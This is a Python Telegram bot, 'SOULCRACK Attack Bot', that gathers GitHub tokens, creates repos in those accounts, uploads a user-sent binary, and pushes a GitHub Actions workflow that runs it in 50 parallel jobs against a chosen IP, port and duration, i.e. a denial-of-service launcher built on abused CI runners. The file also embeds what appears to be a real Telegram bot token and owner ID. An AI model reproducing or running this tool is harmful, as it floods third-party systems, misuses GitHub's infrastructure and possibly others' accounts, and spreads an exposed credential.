import os
import json
import asyncio
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from github import Github, GithubException


BOT_TOKEN = "7323941536:AAEZOL24znhua2iTrIUF31XZSgjvWTIRMME"
OWNER_USER_ID = 6137914349


TOKENS_FILE = "tokens.json"
USERS_FILE = "users.json"
ATTACK_JOBS_FILE = "attack_jobs.json"

def init_storage():
    if not os.path.exists(TOKENS_FILE):
        with open(TOKENS_FILE, 'w') as f:
            json.dump({"tokens": []}, f)
    
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'w') as f:
            json.dump({"users": [OWNER_USER_ID]}, f)
    
    if not os.path.exists(ATTACK_JOBS_FILE):
        with open(ATTACK_JOBS_FILE, 'w') as f:
            json.dump({"jobs": {}}, f)


def load_tokens():
    with open(TOKENS_FILE, 'r') as f:
        return json.load(f)["tokens"]


def save_tokens(tokens):
    with open(TOKENS_FILE, 'w') as f:
        json.dump({"tokens": tokens}, f)


def load_users():
    with open(USERS_FILE, 'r') as f:
        return json.load(f)["users"]

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        json.dump({"users": users}, f)


def load_jobs():
    with open(ATTACK_JOBS_FILE, 'r') as f:
        return json.load(f)["jobs"]


def save_jobs(jobs):
    with open(ATTACK_JOBS_FILE, 'w') as f:
        json.dump({"jobs": jobs}, f)


def is_authorized(user_id):
    users = load_users()
    return user_id in users

def create_SOULCRACK_repo(token):
    try:
        g = Github(token)
        user = g.get_user()
        
        try:
            repo = user.get_repo("SOULCRACK")
            return repo
        except GithubException:
            repo = user.create_repo("SOULCRACK", private=False, auto_init=True)
            return repo
    except Exception as e:
        print(f"Repo error: {e}")
        return None

def update_workflow_and_trigger(token, ip, port, attack_time):
    try:
        g = Github(token)
        user = g.get_user()
        repo = user.get_repo("SOULCRACK")
        
        # TUMHARA EXACT YML
        yml_content = f"""name: Run Soul 50x

on: [push]

jobs:
  soul:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        n: [1,2,3,4,5,6,7,8,9,10,
            11,12,13,14,15,16,17,18,19,20,
            21,22,23,24,25,26,27,28,29,30,
            31,32,33,34,35,36,37,38,39,40,
            41,42,43,44,45,46,47,48,49,50]
    steps:
      - uses: actions/checkout@v3
      - run: chmod +x *
      - run: sudo ./soul {ip} {port} {attack_time}
"""
        
        
        commit_message = f"Attack {ip}:{port} for {attack_time}s"
        
        
        workflow_path = ".github/workflows/main.yml"
        try:
            
            try:
                repo.get_contents(".github/workflows")
            except:
                repo.create_file(".github/workflows/.gitkeep", "Create workflows", "")
            
            
            try:
                contents = repo.get_contents(workflow_path)
                repo.update_file(contents.path, commit_message, yml_content, contents.sha)
                print(f"✅ Workflow updated for {user.login}")
            except:
                repo.create_file(workflow_path, commit_message, yml_content)
                print(f"✅ Workflow created for {user.login}")
            
            return True
            
        except Exception as e:
            print(f"Workflow error: {e}")
            return False
            
    except Exception as e:
        print(f"Error: {e}")
        return False

def upload_binary_to_repo(token, binary_content):
    try:
        g = Github(token)
        user = g.get_user()
        repo = user.get_repo("SOULCRACK")
        
        try:
            contents = repo.get_contents("soul")
            repo.update_file(contents.path, "Update binary", binary_content, contents.sha)
        except:
            repo.create_file("soul", "Add binary", binary_content)
        
        return True
    except Exception as e:
        print(f"Upload error: {e}")
        return False

def get_workflow_status(token):
    try:
        g = Github(token)
        user = g.get_user()
        repo = user.get_repo("SOULCRACK")
        
        workflows = repo.get_workflows()
        running_count = 0
        completed_count = 0
        
        for workflow in workflows:
            runs = workflow.get_runs()
            for run in runs:
                if run.status == "in_progress" or run.status == "queued":
                    running_count += 1
                elif run.status == "completed":
                    completed_count += 1
        
        return running_count, completed_count
    except Exception as e:
        print(f"Status error: {e}")
        return 0, 0

def get_all_workflows_status():
    tokens = load_tokens()
    total_running = 0
    total_completed = 0
    
    for token in tokens:
        try:
            running, completed = get_workflow_status(token)
            total_running += running
            total_completed += completed
        except:
            pass
    
    return total_running, total_completed

def cancel_all_workflows():
 
    tokens = load_tokens()
    cancelled_count = 0
    
    for token in tokens:
        try:
            g = Github(token)
            user = g.get_user()
            repo = user.get_repo("SOULCRACK")
            
            workflows = repo.get_workflows()
            for workflow in workflows:
                runs = workflow.get_runs()
                for run in runs:
                    if run.status == "in_progress" or run.status == "queued":
                        try:
                            run.cancel()
                            cancelled_count += 1
                            print(f"✅ Cancelled workflow for {user.login}")
                        except:
                            pass
        except Exception as e:
            print(f"Cancel error: {e}")
    
    return cancelled_count


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    await update.message.reply_text(
        "🤖 Welcome to SOULCRACK Attack Bot!\n\n"
        "Available commands:\n"
        "/token - Add GitHub token\n"
        "/attack ip port time - Start attack\n"
        "/addbinary - Upload binary file\n"
        "/status - Check workflow status\n"
        "/stop - Stop all attacks\n"
        "/add user_id - Add user\n"
        "/remove user_id - Remove user\n"
        "/users - List authorized users\n"
        "/tokens - List stored tokens"
    )

async def add_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    if not context.args:
        await update.message.reply_text("Please provide a GitHub token: /token YOUR_GITHUB_TOKEN")
        return
    
    token = context.args[0]
    tokens = load_tokens()
    
    if token in tokens:
        await update.message.reply_text("⚠️ This token is already added!")
        return
    
    try:
        g = Github(token)
        user = g.get_user()
        
        repo = create_SOULCRACK_repo(token)
        if repo:
            tokens.append(token)
            save_tokens(tokens)
            await update.message.reply_text(f"✅ Token added! Welcome {user.login}")
        else:
            await update.message.reply_text("❌ Failed to create repo!")
    except Exception as e:
        await update.message.reply_text(f"❌ Invalid token: {str(e)}")

async def list_tokens(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    tokens = load_tokens()
    if not tokens:
        await update.message.reply_text("No tokens added yet!")
        return
    
    message = f"🔑 Stored Tokens ({len(tokens)}):\n\n"
    for i, token in enumerate(tokens, 1):
        try:
            g = Github(token)
            user = g.get_user()
            message += f"{i}. {user.login}\n"
        except:
            message += f"{i}. ❌ Invalid\n"
    
    await update.message.reply_text(message)

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_USER_ID:
        await update.message.reply_text("❌ Only owner can add users!")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /add USER_ID")
        return
    
    try:
        user_id = int(context.args[0])
        users = load_users()
        
        if user_id in users:
            await update.message.reply_text("⚠️ User already added!")
            return
        
        users.append(user_id)
        save_users(users)
        await update.message.reply_text(f"✅ User {user_id} added successfully!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")

async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_USER_ID:
        await update.message.reply_text("❌ Only owner can remove users!")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /remove USER_ID")
        return
    
    try:
        user_id = int(context.args[0])
        users = load_users()
        
        if user_id == OWNER_USER_ID:
            await update.message.reply_text("❌ Cannot remove owner!")
            return
        
        if user_id not in users:
            await update.message.reply_text("❌ User not found!")
            return
        
        users.remove(user_id)
        save_users(users)
        await update.message.reply_text(f"✅ User {user_id} removed successfully!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    users = load_users()
    message = "👥 Authorized Users:\n\n"
    for user_id in users:
        status = "👑 Owner" if user_id == OWNER_USER_ID else "👤 User"
        message += f"{status}: {user_id}\n"
    
    await update.message.reply_text(message)

async def add_binary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    tokens = load_tokens()
    if not tokens:
        await update.message.reply_text("❌ No GitHub tokens added! Use /token first.")
        return
    
    await update.message.reply_text("📤 Please send the binary file...")

async def handle_binary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    if not update.message.document:
        await update.message.reply_text("❌ Please send a file!")
        return
    
    file = await update.message.document.get_file()
    file_path = f"temp_{update.message.document.file_name}"
    await file.download_to_drive(file_path)
    
    with open(file_path, 'rb') as f:
        binary_content = f.read()
    
    os.remove(file_path)
    
    tokens = load_tokens()
    success_count = 0
    failed_count = 0
    
    await update.message.reply_text("🔄 Uploading binary...")
    
    for token in tokens:
        if upload_binary_to_repo(token, binary_content):
            success_count += 1
        else:
            failed_count += 1
    
    await update.message.reply_text(
        f"✅ Upload completed!\nSuccess: {success_count}\nFailed: {failed_count}"
    )

async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack IP PORT TIME")
        return
    
    ip, port, attack_time = context.args
    tokens = load_tokens()
    
    if not tokens:
        await update.message.reply_text("❌ No GitHub tokens added! Use /token first.")
        return
    
    await update.message.reply_text("🔄 Starting attack...")
    
    success_count = 0
    failed_count = 0
    job_id = str(int(time.time()))
    jobs = load_jobs()
    
   
    jobs[job_id] = {
        'ip': ip,
        'port': port,
        'time': attack_time,
        'start_time': time.time(),
        'tokens_used': [],
        'status': 'running'
    }
    
    for token in tokens:
        try:
            g = Github(token)
            user = g.get_user()
            
            if update_workflow_and_trigger(token, ip, port, attack_time):
                success_count += 1
                jobs[job_id]['tokens_used'].append(user.login)
            else:
                failed_count += 1
                
        except Exception as e:
            failed_count += 1
            print(f"Attack error: {e}")
    
    jobs[job_id]['success_count'] = success_count
    save_jobs(jobs)
    
    await update.message.reply_text(
        f"🎯 Attack launched!\nTarget: {ip}:{port}\nTime: {attack_time}s\n"
        f"✅ Successful: {success_count}\n❌ Failed: {failed_count}\n"
        f"📊 Job ID: {job_id}"
    )
    
    
    if success_count > 0:
        asyncio.create_task(monitor_job_completion(job_id, update.message.chat_id))

async def check_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    running, completed = get_all_workflows_status()
    jobs = load_jobs()
    
    active_jobs = 0
    for job_id, job_info in jobs.items():
        if job_info.get('status') == 'running':
            active_jobs += 1
    
    status_message = f"📊 WORKFLOW STATUS:\n\n"
    status_message += f"🟢 Running Workflows: {running}\n"
    status_message += f"✅ Completed Workflows: {completed}\n"
    status_message += f"🔥 Active Jobs: {active_jobs}\n"
    status_message += f"🔑 Total Tokens: {len(load_tokens())}\n\n"
    
    if running == 0 and active_jobs > 0:
        status_message += "⚠️ All workflows completed! You can start new attack.\n"
    elif running > 0:
        status_message += "🎯 Attacks are running...\n"
    else:
        status_message += "💤 No active attacks\n"
    
    await update.message.reply_text(status_message)

async def stop_attacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_authorized(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorized to use this bot!")
        return
    
    await update.message.reply_text("🛑 Stopping all attacks...")
    
   
    cancelled_count = cancel_all_workflows()
    
  
    jobs = load_jobs()
    stopped_jobs = 0
    for job_id, job_info in jobs.items():
        if job_info.get('status') == 'running':
            jobs[job_id]['status'] = 'stopped'
            stopped_jobs += 1
    
    save_jobs(jobs)
    
    await update.message.reply_text(
        f"✅ ALL ATTACKS STOPPED!\n\n"
        f"🛑 Cancelled Workflows: {cancelled_count}\n"
        f"📊 Stopped Jobs: {stopped_jobs}\n\n"
        f"🚀 You can start new attack now!"
    )

async def monitor_job_completion(job_id, chat_id):
    app = Application.builder().token(BOT_TOKEN).build()
    
   
    await asyncio.sleep(120)
    
    jobs = load_jobs()
    if job_id not in jobs:
        return
    
    
    if jobs[job_id].get('status') == 'stopped':
        return
    
    running, completed = get_all_workflows_status()
    
    if running == 0:
       
        job_info = jobs[job_id]
        await app.bot.send_message(
            chat_id=chat_id,
            text=f"✅ ALL ATTACKS COMPLETED!\n\n"
                 f"🎯 Job ID: {job_id}\n"
                 f"🎯 Target: {job_info['ip']}:{job_info['port']}\n"
                 f"⏰ Time: {job_info['time']}s\n"
                 f"✅ Successful: {job_info['success_count']}\n\n"
                 f"🚀 You can start new attack now!"
        )
     
        jobs[job_id]['status'] = 'completed'
        save_jobs(jobs)
    else:
   
        await asyncio.sleep(60)
        running, completed = get_all_workflows_status()
        if running == 0:
            job_info = jobs[job_id]
            await app.bot.send_message(
                chat_id=chat_id,
                text=f"✅ ALL ATTACKS COMPLETED!\n\n"
                     f"🎯 Job ID: {job_id}\n"
                     f"🎯 Target: {job_info['ip']}:{job_info['port']}\n"
                     f"⏰ Time: {job_info['time']}s\n"
                     f"✅ Successful: {job_info['success_count']}\n\n"
                     f"🚀 You can start new attack now!"
            )
            jobs[job_id]['status'] = 'completed'
            save_jobs(jobs)

def main():
    init_storage()
    
    application = Application.builder().token(BOT_TOKEN).build()
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("token", add_token))
    application.add_handler(CommandHandler("tokens", list_tokens))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("addbinary", add_binary))
    application.add_handler(CommandHandler("attack", start_attack))
    application.add_handler(CommandHandler("status", check_status))
    application.add_handler(CommandHandler("stop", stop_attacks))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_binary))
    
    print("🤖 SOULCRACK Bot is running...")
    print(f"👑 Owner ID: {OWNER_USER_ID}")
    application.run_polling()

if __name__ == "__main__":
    main()